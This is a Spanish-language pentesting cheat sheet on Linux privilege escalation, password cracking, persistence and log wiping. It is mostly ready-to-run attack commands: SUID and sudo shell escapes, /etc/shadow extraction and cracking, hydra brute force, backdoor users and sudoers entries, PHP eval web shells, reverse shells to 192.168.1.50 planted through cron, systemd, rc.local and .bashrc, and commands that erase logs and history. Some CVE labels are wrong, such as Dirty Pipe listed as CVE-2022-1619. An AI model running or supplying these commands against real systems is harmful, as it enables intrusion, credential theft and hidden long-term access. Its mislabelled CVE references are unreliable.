# Privesc, Contraseñas y Persistencia

## Escalada de Privilegios (Privesc)

### Información inicial

```bash
whoami / id
sudo -l                              # ver qué binarios se pueden ejecutar como root sin contraseña
cat /etc/sudoers 2>/dev/null
getfacl / find . -name .facl         # ACLs no estándar
```

### Kernel Exploits

```bash
uname -a
lsb_release -a / cat /etc/os-release
sudo apt list --installed | grep -i linux-headers

# SearchSploit
searchsploit "2.6.32" linux privilege escalation
searchsploit Ubuntu 18.04
```

**Vulnerabilidades recientes a revisar:** DirtyCOW (CVE-2016-5195, 2.6.22–4.8.x), OverlayFS (CVE-2021-22555), Dirty Pipe (CVE-2022-1619).

Compilar y ejecutar:

```bash
gcc -o exploit exploit.c -lpthread
chmod +x exploit
./exploit
id        # si funciona, UID=0
```

### SUID Binarios

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -lah {} \;
```

**GTFOBins** (gtfobins.github.io): lista de binarios comunes explotables. Buscar: `vim`, `less`, `find`, `nano`, `man`, `ftp`, `nmap`, `cp`, `mv`, `chmod`, `chown`, `awk`, `sed`, `perl`, `python`, `php`, `ruby`, `node`, `java`.

Ejemplos de escape a shell desde SUID:

```bash
# vim SUID
/usr/bin/vim -c ':!/bin/bash'

# find SUID
find . -exec /bin/bash \;

# nano SUID
nano
Ctrl+R → Ctrl+X → /bin/bash

# nmap SUID (versiones viejas)
nmap --interactive
nmap> !sh

# awk SUID
awk 'BEGIN {system("/bin/bash")}'

# perl SUID
perl -e 'exec "/bin/bash";'
```

Revisar con `strings` para hallar rutas hardcodeadas sin usar ruta absoluta (posible PATH hijacking):

```bash
strings /usr/local/bin/customapp | grep "^/"
# si aparece "rm archivo.txt" sin ruta absoluta, podemos crear un rm malicioso en nuestro PATH
```

### Sudo NOPASSWD

```bash
sudo -l
# Si ves: (ALL) NOPASSWD: /usr/bin/find
sudo /usr/bin/find / -exec /bin/bash \;
```

Binarios peligrosos vía sudo sin restricción de argumentos:

- `find / -exec /bin/bash \;`
- `less` (`:!bash`)
- `vim` (`:!/bin/bash`)
- `awk` / `perl` / `python` (ejecutan código)
- `cp` (sobrescribir `/etc/passwd`)
- `chmod` / `chown` (cambiar permisos)

### Credenciales en archivos

```bash
find / -type f -readable -name "*password*" 2>/dev/null
find / -type f -readable -name "*config*" 2>/dev/null
grep -r "password" /home /etc /opt /var 2>/dev/null
grep -r "PASS\|PASSWORD\|pwd" /var/www/html 2>/dev/null   # código PHP/Python

# Historiales
cat ~/.bash_history / cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.ssh/known_hosts
```

### Fallos lógicos

```bash
# Contraseñas débiles
sudo -u otro_usuario comando        # si el otro usuario tiene contraseña débil

# Servicios corriendo como root sin necesidad
ps aux | grep root

# Criptografía débil
sudo openssl enc -aes-256-cbc ...   # versión vulnerable

# Archivos temporales previsibles
ls -la /tmp
```

### Enumeración automatizada

```bash
# LinEnum.sh (GitHub: rebootuser/LinEnum)
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Privilege Escalation Suggester (GitHub: mzet-/linux-exploit-suggester)
./linux-exploit-suggester.sh

# PEASS (GitHub: carlospolop/privilege-escalation-awesome-scripts-suite)
curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

---

## Gestión de Contraseñas

### Extraer hashes

```bash
# /etc/shadow (requiere root)
sudo cat /etc/shadow | grep -E "^[^:]+:[^\*!]"   # solo cuentas con contraseña

# Exportar para crackear
sudo cat /etc/shadow | cut -d: -f1,2 > hashes.txt

# Formato: usuario:hash
john --show hashes.txt
```

### John the Ripper

```bash
john --format=sha512crypt hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --rules hashes.txt              # reglas para variaciones

john --show hashes.txt               # ver contraseñas encontradas
john --restore                       # continuar sesión anterior

# Crear unshadow (si tienes /etc/passwd y /etc/shadow)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

### Hashcat

```bash
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512
hashcat -m 3200 -a 0 hashes.txt wordlist.txt                      # bcrypt
hashcat -m 5500 -a 0 hashes.txt wordlist.txt                      # Windows NTLM

hashcat --show hashes.txt            # ver resultados
hashcat --restore                    # continuar
```

**Modos comunes:**

|Tipo|Modo|
|---|---|
|MD5|0|
|SHA-1|100|
|SHA-256|1400|
|SHA-512|1700|
|SHA-512 (crypt)|1800|
|bcrypt|3200|
|NTLM (Windows)|1000|

### Fuerza bruta en servicios

```bash
# SSH
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -L users.txt -P pass.txt ssh://192.168.1.100 -t 4

# FTP
hydra -l admin -P pass.txt ftp://192.168.1.100

# HTTP Basic Auth
hydra -l admin -P pass.txt http-get://192.168.1.100/admin -V
```

---

## Persistencia

### Backdoor de usuario

```bash
# Crear usuario backdoor
sudo useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:password123' | sudo chpasswd

# O agregar a sudoers sin contraseña
echo 'backdoor ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers

# SSH pública (no requiere contraseña)
mkdir -p ~/.ssh
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```

### Claves SSH propias

```bash
# En el atacante
ssh-keygen -t rsa -N "" -f attacker_key

# En el target
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Conectar sin contraseña
ssh -i attacker_key username@target
```

### Webshell

```php
<?php system($_GET['cmd']); ?>
```

```bash
cp shell.php /var/www/html/
curl "http://target/shell.php?cmd=whoami"
```

Más ofuscada:

```php
<?php eval($_POST['cmd']); ?>
```

Con formulario HTML:

```html
<form method="POST"><input name="cmd"><input type="submit"></form>
<?php if($_POST) eval($_POST['cmd']); ?>
```

### Cron persistencia

```bash
# Reverse shell cada 5 minutos
(crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'") | crontab -

# Script de backup malicioso
sudo echo "*/1 * * * * /root/backup.sh" >> /etc/crontab
# /root/backup.sh contiene: nc -e /bin/bash 192.168.1.50 4445
```

### rc.local

```bash
# /etc/rc.local se ejecuta al boot (si está habilitado)
sudo echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'" >> /etc/rc.local
sudo chmod +x /etc/rc.local
```

### Systemd service

```bash
# /etc/systemd/system/persistent.service
[Unit]
Description=Persistent Backdoor
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

# Habilitar
sudo systemctl daemon-reload
sudo systemctl enable persistent.service
sudo systemctl start persistent.service
```

### Modificar binarios existentes

```bash
# Hacer backup
sudo cp /usr/bin/sudo /usr/bin/sudo.bak

# Parchear el binario para registrar contraseñas
# (o simplemente agregarle un setuid payload)

# O: agregar comandos a ~/.bashrc que se ejecutan al login
echo '/bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1 &' >> ~/.bashrc
```

---

## Borrar Huellas (Covering Tracks)

⚠️ **En pentesting legítimo esto NO se hace — se documenta todo. Incluida aquí solo como referencia de técnicas defensivas.**

```bash
# Limpiar logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
history -c
cat /dev/null > ~/.bash_history

# Cambiar timestamps
touch -t 202301010000 archivo.txt
touch -r /var/log/syslog archivo.txt   # igualar al de otro archivo

# Remover evidencia de conexión
unset HISTFILE
export HISTFILE=/dev/null
set +o history

# Eliminar de forma segura (no recuperable)
shred -vfz -n 10 archivo.txt

# Ver quién ha estado conectado
last / lastlog / wtmp
```

---

## Checklist de Privesc (referencia de pentesting)

```
1. ¿Qué información tengo del sistema?
   uname -a, lsb_release -a, sudo -l, id, groups

2. ¿Hay kernel exploits aplicables?
   linux-exploit-suggester.sh, SearchSploit

3. ¿Hay binarios SUID/SGID explotables?
   find / -perm -4000/-2000, GTFOBins

4. ¿Sudo sin contraseña o mal configurado?
   sudo -l, binarios peligrosos, PATH hijacking

5. ¿Hay credenciales en archivos/historiales?
   grep -r "password", .bash_history, .mysql_history, config files

6. ¿Hay servicios corriendo con permisos excesivos?
   ps aux | grep root, lsof -p PID

7. ¿Fallos lógicos o contraseñas débiles?
   ssh a otro usuario, cron jobs, archivos temporales

8. ¿Enumeración automatizada?
   LinEnum.sh, PEASS, linux-exploit-suggester
```